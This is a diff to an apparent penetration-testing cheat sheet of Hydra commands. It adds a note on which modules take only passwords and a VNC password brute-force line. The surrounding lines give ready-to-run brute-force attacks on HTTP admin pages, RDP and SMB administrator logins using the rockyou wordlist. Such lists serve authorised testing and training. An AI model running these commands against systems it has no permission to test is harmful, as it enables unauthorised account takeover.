@@ -19,6 +19,10 @@ hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin 		# Hydra attack http 
 hydra -t 1 -V -f -l administrator -P rockyou.txt rdp://$ip 		# Hydra attack Windows Remote Desktop with rockyou
 hydra -t 1 -V -f -l administrator -P rockyou.txt $ip smb 		# Hydra brute force SMB user with rockyou
 
+# Non Usernames
+# redis, adam6500, cisco, oracle-listener, s7-300, snmp and vnc modules are only using the -p or -P option, not login (-l, -L) or colon file (-C)
+hydra -P /usr/share/wordlists/rockyou.txt vnc://$ip
+
 # Hydra HTTP Basic Authenication Brute Force
 hydra -l admin -P /usr/share/wordlists/rockyou.txt $ip -s $port -f http-get / 
 
